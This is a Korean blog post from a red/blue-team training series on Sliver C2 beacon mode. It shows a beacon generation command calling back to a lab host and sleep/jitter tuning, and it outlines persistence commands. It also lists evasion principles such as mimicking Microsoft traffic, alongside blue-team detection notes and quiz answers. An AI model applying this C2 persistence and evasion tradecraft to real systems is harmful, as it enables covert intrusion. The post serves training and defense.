---
layout: post
title: "Sliver Week 6: Beacon 모드 + Sleep / Jitter / Persistence"
date: 2026-05-19 11:00:00 +0900
categories: security red-team blue-team c2 sliver senior
---

## 학습 목표

- Beacon 동작.
- Sleep + Jitter (OpSec).
- Task queue.
- Blue team beacon detection.

## 1. Beacon 동작

implant가 주기 callback (예: 60초). server는 task queue 비움.

```
T+0:   beacon callback → server에 "할 일 있나?" 묻고 → 없으면 sleep
T+60:  beacon callback → ls 명령 받음 → 실행
T+120: beacon callback → 결과 전송
```

OpSec 핵심: 정상 traffic처럼 보이는 패턴.

## 2. Beacon 생성

```sliver
sliver > generate beacon --mtls lab.com:8443 --seconds 60 --jitter 30
```

- seconds: 평균 60초.
- jitter: ±30초 (30~90초 사이).

## 3. Sleep 조정

```sliver
sliver (BEACON) > beacon
sliver (BEACON) > sleep 300 60   # 5분 ± 1분
```

활동 줄임. 더 stealthy.

## 4. Task Queue

```sliver
sliver (BEACON) > use <beacon-id>
sliver (BEACON) > ls
[*] Tasked beacon ABC123 (T+45s)
```

다음 callback에 실행.

## 5. Beacon Pivot

beacon이 다른 implant의 relay. SMB pivot 등 (7주차).

## 6. Persistence (lab만)

```sliver
sliver (BEACON) > registry write --hive HKCU --path "..." --key "..." --value "..."
sliver (BEACON) > services create ...
sliver (BEACON) > schtasks ...
```

Windows registry, service, scheduled task. 재부팅 후 자동 재실행.

## 7. Blue Team Detection

### Time pattern
- 일정 간격 callback = anomaly.
- jitter 적용 후에도 통계적 분석 가능 (Cobalt Strike의 60s jitter 30% 같은 표준 분포).

### Traffic volume
- 작은 outbound packet 정기.

### Suricata / Zeek
- C2 traffic 분석 ruleset.

### EDR
- registry / scheduled task / service 생성 → 정상 사용자 행동 외.

## 8. OpSec 5 원칙

1. Sleep 길게 (5min+).
2. Jitter 큰 비율 (30~50%).
3. Working hour만 활동 (실제 사용자 패턴 흉내).
4. 알려진 정상 service (Microsoft / Cloudflare) 흉내 traffic.
5. 단일 channel 의존 X (multi-listener fallback).

## 9. 자가평가

### Q1. Beacon vs Session?
1. **Beacon 주기, Session 상시**
2. 같음 3. 반대 4. 무관

**정답: 1.**

### Q2. Jitter?
1. **callback 간격 random 변동**
2. UI 3. 빠름 4. 무관

**정답: 1.**

### Q3. Task queue?
1. **server가 명령 queue, beacon이 가져감**
2. 즉시 3. UI 4. 무관

**정답: 1.**

### Q4. Persistence 3종?
1. **registry / service / scheduled task**
2. UI 3. 빠름 4. 무관

**정답: 1.**

### Q5. Blue team time pattern?
1. **정기 callback 통계 분석**
2. UI 3. 빠름 4. 무관

**정답: 1.**

## 10. 다음 주차

[Week 7: Pivot / Port forward].
